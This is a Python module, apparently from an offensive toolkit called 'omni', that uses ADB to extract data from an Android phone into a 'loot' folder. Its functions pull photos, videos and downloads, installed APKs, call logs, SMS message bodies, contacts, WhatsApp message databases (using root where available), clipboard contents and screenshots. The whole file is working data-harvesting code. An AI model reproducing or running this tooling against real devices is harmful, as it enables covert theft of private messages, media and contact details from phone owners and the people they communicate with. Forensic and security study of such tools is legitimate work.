"""Media and data extraction: copy photos, videos, call logs, SMS, contacts."""

from __future__ import annotations

import os

from omni.core import config, console, proc
from omni.android.adb import Adb

__all__ = ["copy_media", "extract_apks", "call_log", "sms", "contacts",
           "whatsapp_pull", "clipboard_dump", "screenshot_to_loot"]

MEDIA_DIRS = ("/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Movies",
              "/sdcard/Download", "/sdcard/Music")


def copy_media(adb: Adb, subdir: str = "media") -> str:
    """Pull every camera/picture/download folder into the loot directory."""
    target = config.output_dir(os.path.join("android", subdir))
    for remote in MEDIA_DIRS:
        if not adb.shell_result("ls", remote).ok:
            continue
        name = remote.rsplit("/", 1)[-1]
        dest = os.path.join(target, name)
        console.info(f"pulling {remote} -> {dest}")
        adb.pull(remote, dest + "/", timeout=1800)
    return target


def extract_apks(adb: Adb, only: str | None = None) -> list[str]:
    """Pull installed APKs out for offline reversing."""
    target = config.output_dir(os.path.join("android", "apks"))
    saved = []
    packages = [only] if only else adb.packages(third_party_only=True)
    for pkg in packages:
        path = adb.extract_apk(pkg, target)
        if path:
            size = os.path.getsize(path)
            console.ok(f"{pkg} -> {path} ({size // 1024} KiB)")
            saved.append(path)
        else:
            console.warn(f"{pkg}: no apk path (split app or protected)")
    return saved


def call_log(adb: Adb) -> str:
    return adb.shell_result("content", "query", "--uri",
                            "content://call_log/calls", "--projection",
                            "date:number:duration:type:name").out


def sms(adb: Adb) -> str:
    return adb.shell_result("content", "query", "--uri",
                            "content://sms", "--projection",
                            "date:address:body:type").out


def contacts(adb: Adb) -> str:
    return adb.shell_result("content", "query", "--uri",
                            "content://com.android.contacts/data/phones",
                            "--projection", "display_name:data1").out


def whatsapp_pull(adb: Adb) -> str | None:
    """Copy the WhatsApp msgstore database (needs root for /data/data)."""
    if not adb.is_rooted():
        console.warn("no root — trying the readable sdcard backup paths only")
    target = config.output_dir(os.path.join("android", "whatsapp"))
    found = None
    for remote in ("/sdcard/WhatsApp/Databases",
                   "/data/data/com.whatsapp/databases"):
        if adb.shell_result("ls", remote).ok:
            dest = os.path.join(target, remote.rsplit("/", 2)[-2])
            adb.pull(remote, dest + "/", timeout=1800)
            found = dest
    return found


def clipboard_dump(adb: Adb) -> str:
    return adb.clipboard_get()


def screenshot_to_loot(adb: Adb, preview: bool = True) -> str:
    target = os.path.join(config.output_dir(os.path.join("android", "screens")),
                          f"screen_{os.urandom(3).hex()}.png")
    adb.screenshot(target)
    if preview and proc.which("chafa"):
        proc.run(["chafa", "--size", "60x30", target], timeout=30)
    return target
